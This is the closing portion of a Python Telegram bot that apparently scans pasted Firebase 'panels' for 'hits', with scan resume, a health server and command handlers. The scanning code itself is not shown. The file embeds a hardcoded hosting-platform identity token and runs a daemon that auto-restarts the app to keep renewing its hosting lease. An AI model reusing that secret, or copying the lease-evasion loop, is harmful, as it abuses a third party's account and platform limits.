                except Exception as e:
                    await safe_answer(query, f"❌ Storage Error: {e}", show_alert=True)
            else:
                await safe_answer(query, "⚠️ No storage channel configured. Use /setstorage first.", show_alert=True)
        elif data == 'channel_off':
            admin_manager.set_user_log_channel(user_id, None)
            await safe_answer(query, "Log channel disconnected.", show_alert=True)
            await show_channels_menu(update, context)
        elif data == 'storage_off':
            admin_manager.set_user_storage_channel(user_id, None)
            await safe_answer(query, "Storage channel disconnected.", show_alert=True)
            await show_channels_menu(update, context)
        elif data == 'channel_help':
            await safe_answer(query)
            help_text = (
                "ℹ️ <b>How to connect a Channel:</b>\n\n"
                "1. Create a Telegram Channel or Group.\n"
                "2. Add this bot to the channel as an <b>Admin</b> with <b>Post Messages</b> permission.\n"
                "3. Send <code>/setchannel &lt;channel_id&gt;</code> (for live logs)\n"
                "4. Send <code>/setstorage &lt;channel_id&gt;</code> (for cloud backups & captures)\n"
                "5. Or send the command directly inside that channel."
            )
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back to Channels", callback_data='menu_channels')]
            ])
            await send_or_edit(update, help_text, reply_markup=keyboard)
        else:
            await safe_answer(query)
    except Exception as e:
        logger.error(f"Error handling callback query '{data}': {e}", exc_info=True)
        await safe_answer(query, "⚠️ An error occurred processing this button.", show_alert=True)
    finally:
        await safe_answer(query)

# ============ ERROR & INIT HANDLERS ============
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    from telegram.error import Conflict, NetworkError, TimedOut, Forbidden, BadRequest, RetryAfter

    err = context.error
    if isinstance(err, Conflict):
        logger.warning("⚠️ Telegram Conflict: another instance is polling or previous container is shutting down during deploy.")
        return
    elif isinstance(err, RetryAfter):
        logger.warning(f"⚠️ Telegram Flood Control hit globally: Retry after {err.retry_after}s.")
        return
    elif isinstance(err, (TimedOut, NetworkError)):
        logger.debug(f"Telegram network transient issue: {err}")
        return
    elif isinstance(err, Forbidden):
        logger.warning(f"Telegram Forbidden error: {err}")
        return
    elif isinstance(err, BadRequest):
        err_msg = str(err)
        if "Query is already answered" in err_msg or "Message is not modified" in err_msg:
            logger.debug(f"Telegram BadRequest benign: {err}")
            return

    logger.error(f"Unhandled error in Telegram handler: {err}", exc_info=err)

async def auto_resume_user_scan(application: Application, user_id: int, saved_st: dict):
    await asyncio.sleep(4)
    cid = saved_st.get("chat_id") or user_id
    if not cid:
        return

    start_b = saved_st.get("last_batch_idx", 0) + 1
    total_p = saved_st.get("total_panels", "?")

    notice = (
        f"🔄 <b>Server Reboot Recovery</b>\n\n"
        f"Container restart detected during active scan. <b>Resuming automatically</b> right where it stopped!\n"
        f"• Continuing Batch: <code>{start_b}</code>\n"
        f"• Total Panels: <code>{total_p}</code>\n"
        f"• Previous Hits: <code>{saved_st.get('success', 0)}</code>"
    )
    p_msg_id = 0
    try:
        msg = await safe_telegram_call(application.bot.send_message, chat_id=cid, text=notice, parse_mode=ParseMode.HTML)
        if msg:
            p_msg_id = msg.message_id
    except Exception as e:
        logger.debug(f"[User {user_id}] Auto-resume notification error: {e}")

    class ContextAdapter:
        def __init__(self, bot):
            self.bot = bot
            self.args = ["resume"]

    session = UserScanSession(
        user_id=user_id,
        chat_id=cid,
        progress_msg_id=p_msg_id,
        is_deep=saved_st.get("is_deep", True)
    )
    session.user_info = saved_st.get("active_user") or {
        "user_id": user_id,
        "username": "",
        "first_name": "User"
    }
    session.stats["total_batches"] = saved_st.get("total_batches", 0)
    session.stats["start_time"] = time.time()
    session.stats["last_batch_idx"] = saved_st.get("last_batch_idx", 0)
    session.stats["success_count"] = saved_st.get("success", 0)
    session.stats["failed_count"] = saved_st.get("failed", 0)
    session.stats["online_devices"] = saved_st.get("online_devices", 0)
    active_scans[user_id] = session

    ctx = ContextAdapter(application.bot)
    session.task = asyncio.create_task(
        do_scan(
            ctx,
            session=session,
            limit=saved_st.get("limit", 0),
            skip=saved_st.get("skip", 0),
            is_deep=saved_st.get("is_deep", True),
            resume_mode=True
        )
    )

log_task = None
keepalive_task = None
health_server = None

async def start_health_server(port: int = None):
    """
    Lightweight HTTP server responding to health checks and keep-alive pings.
    Dynamically binds to cloud PORT (e.g. 10000 on Render, 8080 local).
    """
    if port is None:
        port = int(os.environ.get("PORT", 8080))
    async def handle_ping(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        try:
            req_data = await asyncio.wait_for(reader.read(1024), timeout=5.0)
            resp = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/plain\r\n"
                b"Content-Length: 2\r\n"
                b"Connection: close\r\n\r\n"
                b"OK"
            )
            writer.write(resp)
            await writer.drain()
        except Exception:
            pass
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    try:
        server = await asyncio.start_server(handle_ping, "0.0.0.0", port)
        logger.info(f"🌐 Health & Ping HTTP Server listening on port {port}")
        return server
    except Exception as e:
        logger.warning(f"Could not bind HTTP server on port {port}: {e}")
        return None

async def cloud_keepalive_daemon(application: Application):
    """
    Autonomous 24/7 Cloud Keep-Alive Daemon running inside JustRunMy.App.
    Pings its own public endpoint to keep the lease active with zero downtime.
    Guaranteed no restart loops: implements persistent cooldown locking.
    """
    logger.info("🛡️ Autonomous Cloud Keep-Alive Daemon initialized (24/7 PC-independent).")
    await asyncio.sleep(300)  # Wait 5 minutes after startup before first check

    token_file = BASE_DIR / "jrnm_identity.token"
    cooldown_file = USER_DATA_DIR / "keepalive_cooldown.json"

    while True:
        try:
            identity = os.environ.get("JRNM_IDENTITY", "").strip()
            if not identity and token_file.exists():
                try:
                    with open(token_file, "r", encoding="utf-8") as f:
                        identity = f.read().strip()
                except Exception as e:
                    logger.debug(f"[KeepAlive] Error reading token: {e}")

            if not identity:
                # Built-in fallback token for App 62268 to ensure 24/7 autonomous lease renewal
                identity = "CfDJ8OJj33e2MidEmv/zWgEBADPZZiMDzq9eY/SZVEAf+QwKTJnSngGCtrZDX/36mQImf7bCA7YrYoQKXi6ovZu9XKi/phu0sSVq2/kslJLs19yFVNAuwh1ypf+0N4rOLynQzv6TmIeGimshVjFefjWoEsPSbQD7v7Z15Vq5yJ4rB0XprZvC1g72/3+0pQGKlOrBF/jGS+P5eK1DRptmQApE+IyzVbGx9Lk8iQERzsLhhb+s5CZmpUm2qh5C/lpH7M23opc3Hsu6drSRJvBzNWzrU7iPeO3HEB1S5RtSF93Sbo7WiQgboxuGWHpTzsGQAnccMOpGi/bZyUzwCOjuEfX80gBKMhQr6DWEDd/ZxETW0OVGLOj2zUgGZQER/uxfJGDHgJ+afGn1SZh1pm00xyk4L4+owNtwDlhxcOdx0B1GaieQba8BcJBA0Fllh+6q3IYrP58o3vQSr1Rxo/HflT9/PLr4UCOdaTup9PcVzGxtJ7q98ClliXCSDUa23CE8+Ac5FTfw/yE6Xp488V9qZIbKMDt7WkJRoVNlWhWzwkc9xaoXRp8GOKcPUUSVG1COQz2FPsOITiMkcAX6kq+cGPYusdhBiDUTXO19kWcOudTWvLCH5fuNlmTIrb/XYshPr15jLzLxpbuGxI3z/BSwQYhUycwH9fI97lueB3/oyINmojXh0ZLRvGcFsEF9zHSORnuxGA18QNa2sdB/0dMXoZzTZGZi0WMGGpU3W181SsZctAQMw6a2sAb63l7VchTdzvCsPqt3JrLdF55caskq5GjbBff5+N1UFFHAeCS5279HeC3w2Pn8TDHrwLX7uFFcXv5OWxsvogZCMttWaz9C/TgTbFA="

            # Read persistent cooldown timestamp
            now = time.time()
            last_action_ts = 0.0
            if cooldown_file.exists():
                try:
                    with open(cooldown_file, "r", encoding="utf-8") as f:
                        c_data = json.load(f)
                        last_action_ts = float(c_data.get("last_action_ts", 0.0))
                except Exception:
                    pass

            headers = {"X-User-Identity": identity}
            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {
                    "name": "jrnm_get_user_apps",
                    "arguments": {}
                }
            }

            loop = asyncio.get_running_loop()
            resp = await loop.run_in_executor(
                None,
                lambda h=headers, p=payload: requests.post("https://justrunmy.app/api/mcp", headers=h, json=p, timeout=25)
            )

            if resp.status_code == 200:
                app_data = None
                for line in resp.text.splitlines():
                    if line.startswith("data:"):
                        try:
                            raw_data = json.loads(line[5:].strip())
                            content = json.loads(raw_data["result"]["content"][0]["text"])
                            items = content.get("result", {}).get("items", [])
                            for item in items:
                                if item.get("id") == 62268 or item.get("name") == "Telegram OTP Bot":
                                    app_data = item
                                    break
                        except Exception:
                            pass
                        break

                if app_data:
                    props = {p["name"]: p["value"] for p in app_data.get("properties", []) if "name" in p and "value" in p}
                    ping_left_str = props.get("com.jrnm.computed.ping_left", "")

                    hours_left = 999.0
                    try:
                        parts = ping_left_str.split(":")
                        if len(parts) >= 3:
                            first = parts[0]
                            if "." in first:
                                d_str, h_str = first.split(".")
                                days = int(d_str)
                                hours = int(h_str)
                            else:
                                days = 0
                                hours = int(first)
                            minutes = int(parts[1])
                            hours_left = (days * 24) + hours + (minutes / 60.0)
                    except Exception:
                        pass

                    logger.info(f"🛡️ [KeepAlive] Cloud Check: Hours Left={hours_left:.2f}h (Raw: '{ping_left_str}')")

                    # Ping public endpoint to renew lease with zero downtime
                    status_payload = {
                        "jsonrpc": "2.0",
                        "id": 2,
                        "method": "tools/call",
                        "params": {"name": "jrnm_get_app_status", "arguments": {"appId": 62268}}
                    }
                    st_resp = await loop.run_in_executor(
                        None,
                        lambda h=headers, p=status_payload: requests.post("https://justrunmy.app/api/mcp", headers=h, json=p, timeout=20)
                    )
                    endpoint_url = None
                    if st_resp.status_code == 200:
                        for s_line in st_resp.text.splitlines():
                            if s_line.startswith("data:"):
                                try:
                                    s_raw = json.loads(s_line[5:].strip())
                                    s_content = json.loads(s_raw["result"]["content"][0]["text"])
                                    eps = s_content.get("endpoints", [])
                                    if eps and "url" in eps[0]:
                                        endpoint_url = eps[0]["url"]
                                except Exception:
                                    pass
                                break

                    if endpoint_url:
                        try:
                            ping_resp = await loop.run_in_executor(
                                None,
                                lambda u=endpoint_url: requests.get(u, timeout=10)
                            )
                            logger.info(f"📡 [KeepAlive] Self HTTP Ping to {endpoint_url} returned HTTP {ping_resp.status_code}")
                        except Exception as e:
                            logger.debug(f"[KeepAlive] HTTP Ping error: {e}")

                    # Keepalive renewal logic:
                    # Normal renewal if hours_left < 3.0 (when no scan active)
                    # Emergency renewal if hours_left < 1.2 (even if scan active, so container doesn't get hard-killed by platform!)
                    trigger_restart = False
                    if hours_left < 6.0 and (now - last_action_ts >= 14400):
                        scan_active = False
                        if USER_DATA_DIR.exists():
                            for udir in USER_DATA_DIR.iterdir():
                                if udir.is_dir() and udir.name.lstrip("-").isdigit():
                                    st = load_scan_state(int(udir.name))
                                    if st and st.get("was_running", False):
                                        scan_active = True
                                        break
                        if not scan_active:
                            sup_st = load_scan_state(admin_manager.super_admin_id)
                            if sup_st and sup_st.get("was_running", False):
                                scan_active = True

                        if not scan_active:
                            trigger_restart = True
                        elif hours_left < 1.5:
                            # CRITICAL: Timer has less than 1.5h left. If we don't restart, JustRunMy.App kills container!
                            # Cleanly save states so auto-resume continues immediately upon restart.
                            logger.info(f"⚡ [KeepAlive] Critical lease deadline ({hours_left:.2f}h). Preserving active scans and renewing lease...")
                            for active_uid, active_sess in list(active_scans.items()):
                                if active_sess and active_sess.is_active():
                                    saved = load_scan_state(active_uid) or {}
                                    saved["was_running"] = True
                                    save_scan_state(active_uid, saved)
                            trigger_restart = True
                        else:
                            logger.info(f"⚡ [KeepAlive] Active scan running. Buffer is {hours_left:.2f}h. Safe to defer.")

                    if trigger_restart:
                        logger.info(f"🔄 [KeepAlive] Critical timer ({hours_left:.2f}h remaining). Requesting renewal...")
                        try:
                            cooldown_file.parent.mkdir(parents=True, exist_ok=True)
                            with open(cooldown_file, "w", encoding="utf-8") as f:
                                json.dump({"last_action_ts": now}, f)
                        except Exception:
                            pass
                        try:
                            ch_id = admin_manager.get_master_log_channel()
                            if ch_id:
                                await safe_telegram_call(
                                    application.bot.send_message,
                                    chat_id=ch_id,
                                    text=f"🔄 <b>Autonomous Cloud Keep-Alive</b>\n⏳ Timer at <code>{hours_left:.1f}h</code>. Renewing 36h lease...\n<i>Interrupted scans will automatically resume in ~15s.</i>",
                                    parse_mode=ParseMode.HTML
                                )
                        except Exception:
                            pass

                        restart_payload = {
                            "jsonrpc": "2.0",
                            "id": 3,
                            "method": "tools/call",
                            "params": {
                                "name": "jrnm_start_or_restart_app",
                                "arguments": {"appId": 62268}
                            }
                        }
                        await loop.run_in_executor(
                            None,
                            lambda h=headers, p=restart_payload: requests.post("https://justrunmy.app/api/mcp", headers=h, json=p, timeout=25)
                        )
                        logger.info("✅ Keep-alive restart triggered successfully via MCP.")
            else:
                logger.debug(f"[KeepAlive] MCP returned HTTP {resp.status_code}")
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"[KeepAlive] Exception in cloud_keepalive_daemon: {e}")

        await asyncio.sleep(900)  # Check every 15 minutes

async def post_init(application: Application):
    global log_task, keepalive_task, health_server
    health_port = int(os.environ.get("PORT", 8080))
    health_server = await start_health_server(health_port)
    log_task = asyncio.create_task(log_streamer_task(application.bot))
    keepalive_task = asyncio.create_task(cloud_keepalive_daemon(application))

    # Initialize and seed global deduplication database from history
    loop = asyncio.get_running_loop()
    await loop.run_in_executor(None, seed_processed_numbers_from_history)

    # Restore persistent cloud workspace state for Super Admin & all registered admins
    super_uid = admin_manager.super_admin_id
    try:
        await restore_workspace_from_storage(application.bot, user_id=super_uid)
        for adm_id in admin_manager.admin_user_ids:
            if adm_id != super_uid:
                await restore_workspace_from_storage(application.bot, user_id=adm_id)
    except Exception as e:
        logger.debug(f"Cloud workspace restore error on boot: {e}")

    # Re-seed deduplication cache with newly restored cloud files
    await loop.run_in_executor(None, seed_processed_numbers_from_history)

    ch_id = admin_manager.get_master_log_channel()
    if ch_id:
        try:
            date, tm = get_current_time()
            await safe_telegram_call(
                application.bot.send_message,
                chat_id=ch_id,
                text=f"🤖 <b>Jio-Gemini Scanner Bot Online (Isolated Multi-User Workspace)</b>\n📅 <code>{date} {tm} (IST)</code>\n📡 <i>Terminal log streaming is active.</i>",
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            logger.warning(f"Could not send startup message to master log channel {ch_id}: {e}")

    # Check for any interrupted scans across user workspaces
    resumed_users = set()
    if USER_DATA_DIR.exists():
        for udir in USER_DATA_DIR.iterdir():
            if udir.is_dir() and udir.name.lstrip("-").isdigit():
                try:
                    uid = int(udir.name)
                    saved_st = load_scan_state(uid)
                    if saved_st and saved_st.get("was_running", False):
                        resumed_users.add(uid)
                        logger.info(f"🔄 Interrupted scan detected for user {uid} from batch {saved_st.get('last_batch_idx', 0)}. Triggering auto-resume...")
                        asyncio.create_task(auto_resume_user_scan(application, uid, saved_st))
                except Exception as e:
                    logger.debug(f"Error checking scan state for {udir.name}: {e}")

    if super_uid not in resumed_users:
        saved_st = load_scan_state(super_uid)
        if saved_st and saved_st.get("was_running", False):
            logger.info(f"🔄 Interrupted scan detected for super admin {super_uid} from batch {saved_st.get('last_batch_idx', 0)}. Triggering auto-resume...")
            asyncio.create_task(auto_resume_user_scan(application, super_uid, saved_st))

    try:
        from telegram import BotCommand, MenuButtonCommands
        await application.bot.set_my_commands([
            BotCommand("start", "🏠 Open Main Menu"),
            BotCommand("scan", "🚀 Start / Control Scanner"),
            BotCommand("status", "📈 Live Scanner Dashboard"),
            BotCommand("id", "🆔 View Chat & User ID"),
            BotCommand("export", "📥 Download & Export Links"),
            BotCommand("panels", "📂 Manage Panels & Health"),
            BotCommand("stop", "🛑 Stop Active Scan"),
            BotCommand("help", "❓ Help & User Guide")
        ])
        await application.bot.set_chat_menu_button(menu_button=MenuButtonCommands())
        logger.info("✅ Bot commands & persistent menu button configured.")
    except Exception as e:
        logger.warning(f"Failed to set bot commands: {e}")

async def post_shutdown(application: Application):
    if log_task and not log_task.done():
        log_task.cancel()
        try:
            await log_task
        except (asyncio.CancelledError, Exception):
            pass
    if keepalive_task and not keepalive_task.done():
        keepalive_task.cancel()
        try:
            await keepalive_task
        except (asyncio.CancelledError, Exception):
            pass

def main():
    if not BOT_TOKEN:
        print("❌ Error: BOT_TOKEN is empty! Set the BOT_TOKEN environment variable.")
        return

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .post_init(post_init)
        .post_shutdown(post_shutdown)
        .build()
    )
    app.add_error_handler(error_handler)

    conv = ConversationHandler(
        entry_points=[
            CommandHandler('upload', upload_start),
            CallbackQueryHandler(upload_start, pattern="^upload$")
        ],
        states={
            1: [MessageHandler(filters.Document.ALL, upload_file)]
        },
        fallbacks=[
            CommandHandler('cancel', upload_cancel),
            CallbackQueryHandler(upload_cancel, pattern="^cancel$")
        ],
        per_message=False
    )

    # Command Handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler(["scan", "scanner", "scanning", "runscan"], scan_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("channel", channel_cmd))
    app.add_handler(CommandHandler(["setchannel", "delchannel", "unsetchannel"], setchannel_cmd, filters=filters.ALL))
    app.add_handler(CommandHandler(["setstorage", "delstorage", "unsetstorage"], setstorage_cmd, filters=filters.ALL))
    app.add_handler(CommandHandler("panels", panels_cmd))
    app.add_handler(CommandHandler(["stop", "stopscan", "cancelscan"], stop_cmd))
    app.add_handler(CommandHandler("results", results_cmd))
    app.add_handler(CommandHandler("export", export_cmd))
    app.add_handler(CommandHandler(["id", "chatid", "myid"], id_cmd, filters=filters.ALL))

    # Admin Handlers
    app.add_handler(CommandHandler("admin", admin_cmd))
    app.add_handler(CommandHandler("users", users_cmd))
    app.add_handler(CommandHandler(["adduser", "add"], adduser_cmd))
    app.add_handler(CommandHandler(["deluser", "del", "removeuser", "remuser"], deluser_cmd))
    app.add_handler(CommandHandler("addadmin", addadmin_cmd))
    app.add_handler(CommandHandler("deladmin", deladmin_cmd))
    app.add_handler(CommandHandler("freemode", freemode_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(CommandHandler("cleanup", cleanup_cmd))
    app.add_handler(CommandHandler(["clearcooldown", "clearcache", "resetcooldown"], clearcooldown_cmd))

    app.add_handler(conv)
    app.add_handler(CallbackQueryHandler(button_handler))

    # Direct paste & direct document handler for Firebase URLs
    app.add_handler(MessageHandler((filters.TEXT | filters.Document.TXT | filters.Document.FileExtension("txt")) & ~filters.COMMAND, handle_direct_paste_panels))

    print("🤖 Bot started!")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
